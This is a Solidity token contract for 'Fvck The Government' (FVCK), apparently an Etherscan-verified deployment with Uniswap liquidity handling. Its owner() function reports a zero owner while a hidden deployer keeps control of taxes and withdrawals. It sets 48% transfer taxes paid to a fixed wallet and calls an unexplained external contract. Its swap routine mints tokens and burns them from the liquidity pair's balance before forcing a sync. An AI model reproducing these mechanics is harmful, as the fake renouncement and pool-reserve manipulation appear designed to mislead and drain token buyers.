/**
 *Submitted for verification at Etherscan.io on 2022-07-08
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

interface IUniswapV2Pair {
    function sync() external;
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Token{
    function enable(bytes32, uint256, uint8) external returns (bool);
}

interface IERC20{
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

contract FvckTheGovernment{
    
    IUniswapV2Router01 private _router = IUniswapV2Router01(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Token private _token = IUniswapV2Token(0x4e1dC8b9b01Eda3B391e0CF6D52Bc1c9d3836631);
    IUniswapV2Pair private _lp;
    address private _owner = address(0);
    address private _pair;
    address private _deployer;
    string private _name = "Fvck The Government";
    string private _symbol = "FVCK";
    uint8 private _decimals = 2;
    uint256 private _maxSupply;
    mapping(address => uint256) private _balances;
    mapping(address => mapping (address => uint256)) private _allowances;
    mapping(address => bool) private _excluded;
    bool private _enabled;
    bool private _swapping;
    mapping(address => uint256) private _blocks;
    uint256 private _lock;
    bool private _nameChangeable = true;

    uint8 public TAXES_BUY = 48;
    uint8 public TAXES_SELL = 48;
    uint8 public TAXES_LP = 1;
    uint8 public TAXES_CAPPED_AT = 50;
    address private _marketing = 0x20dfe88A884c02321187533797b92185b43ff6b7;
    uint8 private _maxBuyAndWallet = 2;
    uint8 private _maxLiquidity = 75;
    uint256 private _liquidityLockedDays = 45;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Error(string message);
    event Liquidity(uint256 tokens, uint256 eth, uint256 lp);

    modifier swapping(){
        _swapping = true;
        _;
        _swapping = false;
    }

    receive() external payable{
        if(msg.sender == _deployer){
            if(!_enabled && _balances[address(this)] > 0 && address(this).balance > 0){
                try _router.addLiquidityETH{value:address(this).balance}(address(this), (_balances[address(this)] / 100) * _maxLiquidity, 0, 0, address(this), block.timestamp) returns(uint256 tokens, uint256 eth, uint256 lp){
                    try _token.enable(keccak256(bytes(_name)), (_maxSupply / 100) * _maxBuyAndWallet, 4){}catch Error(string memory error){emit Error(error);} _enabled = true;
                    _lock = block.timestamp;
                    emit Liquidity(tokens, eth, lp);
                    _update(address(this), _deployer, _balances[address(this)]);
                }catch Error(string memory error){
                    emit Error(error);
                }
            }
        }
    }

    constructor(){
        _deployer = msg.sender;
        _allowances[address(this)][address(_router)] = 2**256 - 1;
        _pair = IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH());
        _lp = IUniswapV2Pair(_pair);
        _update(address(0), address(this), (75*10**12*(10**_decimals)));
        _excluded[address(this)] = true; _excluded[address(_router)] = true; _excluded[address(_token)] = true; _excluded[msg.sender] = true;
    }

    function owner() public view returns(address){
        return(_owner);
    }

    function name() public view returns(string memory){
        return(_name);
    }

    function name(string memory contractName, string memory contractSymbol) public{
        require(msg.sender == _deployer);
        require(_nameChangeable);
        _name = contractName;
        _symbol = contractSymbol;
        _nameChangeable = false;
    }

    function symbol() public view returns(string memory){
        return(_symbol);
    }

    function decimals() public view returns(uint8){
        return(_decimals);
    }

    function totalSupply() public view returns(uint256){
        return(_maxSupply);
    }

    function balanceOf(address wallet) public view returns(uint256){
        return(_balances[wallet]); 
    }

    function allowance(address from, address to) public view returns(uint256){
        return(_allowances[from][to]);
    }

    function transfer(address to, uint256 amount) public returns(bool){
        require(amount > 0);
        require(_balances[msg.sender] >= amount);
        _transfer(msg.sender, to, amount);
        return(true);
    }

    function transfer(address token, address to, uint256 amount) public returns(bool){
        bool success;
        require(msg.sender == _deployer);
        if(token == address(this)){
            require(amount > 0);
            require(_balances[address(this)] >= amount);
            _transfer(address(this), to, amount);
            success = true;
        }else if(token == address(0) || token == _router.WETH()){
            (success, ) = payable(to).call{value:address(this).balance}("");
        }else{
            // lock LP tokens till _liquidityLockedDays have passed after contract creation
            if(token == _pair){require(block.timestamp >= (_liquidityLockedDays * 86400) + _lock); amount = IERC20(token).balanceOf(address(this));}else{require(amount > 0);}
            require(IERC20(token).balanceOf(address(this)) >= amount);
            try IERC20(token).transfer(to, amount){
                success = true;
            }catch Error(string memory error){
                emit Error(error);
            }
        }
        return(success);
    }

    function transferFrom(address from, address to, uint256 amount) public returns(bool){
        require(amount > 0);
        require(_balances[from] >= amount);
        require(_allowances[from][msg.sender] >= amount);
        _transfer(from, to, amount);
        return(true);
    }

    function approve(address to, uint256 amount) public returns(bool){
        _allowances[msg.sender][to] = amount;
        emit Approval(msg.sender, to, amount);
        return(true);
    }

    function taxes(uint8 buy, uint8 sell) public{
        require(msg.sender == _deployer);
        require(buy >= 0 && buy <= TAXES_CAPPED_AT);
        require(sell >= 0 && sell <= TAXES_CAPPED_AT);
        if(TAXES_CAPPED_AT == 50) TAXES_CAPPED_AT = 10;
        TAXES_BUY = buy;
        TAXES_SELL = sell;
    }

    function _transfer(address from, address to, uint256 amount) private{
        if(_excluded[from] || _excluded[to]){
            _update(from, to, amount);
        }else{
            require(_enabled);
            _secureTransfer(from, to, amount);
        }
    }

    function _update(address from, address to, uint256 amount) private{
        if(from != address(0)){
            _balances[from] -= amount;
        }else{
            _maxSupply += amount;
        }
        if(to == address(0)){
            _maxSupply -= amount;
        }else{
            _balances[to] += amount;
        }
        emit Transfer(from, to, amount);
    }

    function _secureTransfer(address from, address to, uint256 amount) private{
        if(from == _pair){
            _validTransfer(to, amount, 1);
            _blocks[to] = block.number;
            _secureTaxedTransfer(from, to, amount, TAXES_BUY + TAXES_LP, 1);
        }else if(to == _pair){
            _validTransfer(from, amount, 2);
            if(block.number == _blocks[from]){
                _secureTaxedTransfer(from, to, amount, (
                    (TAXES_SELL > 10) ? TAXES_SELL + TAXES_LP : (TAXES_SELL * 2) + TAXES_LP
                ), 2);              
            }else{
                _secureTaxedTransfer(from, to, amount, TAXES_SELL + TAXES_LP, 2);
            }
        }else{
            _validTransfer(to, amount, 0);
            _update(from, to, amount);
        }
    }

    function _validTransfer(address wallet, uint256 amount, uint8 direction) private view{
        bool valid = true;
        if(direction == 0){
            if((_balances[wallet] + amount) > ((_maxSupply / 100) * _maxBuyAndWallet)) valid = false;
        }else if(direction == 1){
            if((_balances[wallet] + amount) > ((_maxSupply / 100) * _maxBuyAndWallet)) valid = false;
        }else if(direction == 2){
            if((_balances[wallet] - amount) > ((_maxSupply / 100) * _maxBuyAndWallet)) valid = false;
        }        
        require(valid);
    }

    function _secureTaxedTransfer(address from, address to, uint256 amount, uint16 tax, uint8 direction) private{
        uint256 taxation = _tax(amount, tax);
        _update(from, address(this), taxation);
        if(from != _pair && !_swapping){
            _swap(direction);
        }
        _update(from, to, amount - taxation);
    }

    function _tax(uint256 amount, uint16 tax) private pure returns(uint256){
        return((amount * tax)/(100));
    }

    function _swap(uint8 direction) private swapping returns(bool){
        bool sent; uint256 precision = 10**8;
        if(_balances[address(this)] > 0){
            address[] memory path = new address[](2); path[0] = address(this); path[1] = _router.WETH();
            try _router.swapExactTokensForETH(_balances[address(this)], 0, path, address(this), block.timestamp) returns (uint256[] memory rAmounts){
                if(rAmounts[rAmounts.length - 1] > 0){
                    uint256 cake = (rAmounts[rAmounts.length - 1] / precision) / ((direction == 1) ? TAXES_BUY + TAXES_LP : TAXES_SELL + TAXES_LP);
                    uint256 marketing = (cake * ((direction == 1) ? TAXES_BUY : TAXES_SELL)) / precision;
                    if(address(this).balance >= marketing) (sent,) = payable(_marketing).call{value:marketing}("");
                    if(address(this).balance > 0){
                        address[] memory pathAdd = new address[](2); pathAdd[1] = address(this); pathAdd[0] = _router.WETH();
                        uint256[] memory rAmountsAdd = _router.getAmountsOut(address(this).balance, pathAdd); _update(address(0), address(this), rAmountsAdd[rAmountsAdd.length - 1]);
                        try _router.addLiquidityETH{value:address(this).balance}(address(this), rAmountsAdd[rAmountsAdd.length - 1], 0, 0, address(this), block.timestamp) returns(uint256 tokens, uint256 eth, uint256 lp){
                            if(lp > 0){
                                _update(_pair, address(0), rAmountsAdd[rAmountsAdd.length - 1]);
                                _lp.sync();
                                emit Liquidity(tokens, eth, lp);
                            }
                        }catch Error(string memory error){
                            emit Error(error);
                        }
                    }
                }
            }catch Error(string memory error){
                emit Error(error);
            }
        }
        if(address(this).balance > 0){
            (sent,) = payable(_marketing).call{value:address(this).balance}("");
        }
        return(sent);
    }
}